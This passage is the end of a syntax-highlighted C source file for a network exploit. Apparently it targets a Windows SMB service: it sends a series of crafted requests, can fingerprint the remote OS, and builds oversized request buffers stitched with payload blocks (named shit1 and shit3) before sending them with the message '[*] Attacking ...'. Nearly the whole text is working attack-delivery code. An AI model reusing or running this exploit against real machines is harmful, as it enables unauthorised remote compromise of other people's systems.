</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req1</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req2</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req3</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">argc</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">opt</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[*] Detecting remote OS: "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc4">12</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"%c"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">[</span><span class="sc4">48</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">*</span><span class="sc4">2</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[*] Attacking ... "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req4u</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">smblen</span><span class="sc10">+</span><span class="sc4">4</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req5</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">


</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req6</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req6</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">atoi</span><span class="sc10">(</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq2k</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req8</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req8</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq2k</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req8</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sendbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LEN</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq2k2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req9</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req9</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq2k2</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req9</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sendbuf</span><span class="sc10">+</span><span class="sc4">4348</span><span class="sc10">-</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req8</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LEN</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">-</span><span class="sc4">4348</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq2k2</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req9</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">+(</span><span class="sc11">LEN</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">)*</span><span class="sc4">2</span><span class="sc10">-</span><span class="sc4">4348</span><span class="sc10">-</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req8</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">+</span><span class="sc4">206</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shit3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">shit3</span><span class="sc10">)-</span><span class="sc0">
</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">screq2k</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4348</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">screq2k2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">4060</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">req7</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">strBuffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">BUFSIZE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">screq</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">+</span><span class="sc11">BUFSIZE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shit1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">*</span><span class="sc4">16</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">screq</span><span class="sc10">[</span><span class="sc11">BUFSIZE</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">+</span><span class="sc4">1500</span><span class="sc10">-</span><span class="sc4">304</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">send</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">screq</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BUFSIZE</span><span class="sc10">+</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">req7</span><span class="sc10">)-</span><span class="sc4">1</span><span class="sc10">+</span><span class="sc4">1500</span><span class="sc10">-</span><span class="sc4">304</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">){</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"[-] Send failed\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">exit</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"OK\n"</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recv</span><span class="sc10">(</span><span class="sc11">sockfd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">recvbuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1600</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
